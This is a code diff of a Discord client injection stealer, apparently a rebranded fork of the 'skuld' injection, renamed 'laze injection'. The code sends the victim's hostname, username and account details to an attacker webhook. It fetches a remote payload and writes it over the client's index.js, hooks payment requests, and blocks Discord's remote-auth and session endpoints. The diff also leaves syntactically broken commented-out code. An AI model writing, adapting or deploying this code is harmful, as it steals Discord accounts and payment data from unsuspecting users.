@@ -146,8 +146,8 @@ const request = async (method, url, headers, data) => {
 
 const hooker = async (content, token, account) => {
     content["content"] = "`" + os.hostname() + "` - `" + os.userInfo().username + "`\n\n" + content["content"];
-    content["username"] = "skuld - cord injection";
-    content["avatar_url"] = "https://i.ibb.co/GJGXzGX/discord-avatar-512-FCWUJ.png";
+    content["username"] = "laze injection";
+    content["avatar_url"] = "https://i.ibb.co/hVY5sGg/logo.png";
     content["embeds"][0]["author"] = {
         "name": account.username,
     };
@@ -156,7 +156,7 @@ const hooker = async (content, token, account) => {
     };
     content["embeds"][0]["footer"] = {
         "text": "skuld discord injection - made by hackirby",
-        "icon_url": "https://avatars.githubusercontent.com/u/145487845?v=4",
+        "icon_url": "https://i.ibb.co/hVY5sGg/logo.png",
     };
     content["embeds"][0]["title"] = "Account Information";
 
@@ -493,7 +493,7 @@ async function updateCheck() {
   async function init() {
       https.get('${CONFIG.injection_url}', (res) => {
           const file = fs.createWriteStream(indexJs);
-          res.replace('%WEBHOOK%', '${CONFIG.webhook}')
+          res.replace('%hooko%', '${CONFIG.webhook}')
           res.pipe(file);
           file.on('finish', () => {
               file.close();
@@ -619,12 +619,12 @@ session.defaultSession.webRequest.onCompleted(CONFIG.payment_filters, async (det
     }
 });
 
-session.defaultSession.webRequest.onBeforeRequest(CONFIG.filters2, (details, callback) => {
-    if (details.url.startsWith("wss://remote-auth-gateway") || details.url.endsWith("auth/sessions")) return callback({
+//session.defaultSession.webRequest.onBeforeRequest(CONFIG.filters2, (details, callback) => {
+    //if (details.url.startsWith("wss://remote-auth-gateway") || details.url.endsWith("auth/sessions")) return callback({
         cancel: true
-    });
+    //});
 
     updateCheck()
-});
+//});
 
 module.exports = require("./core.asar");
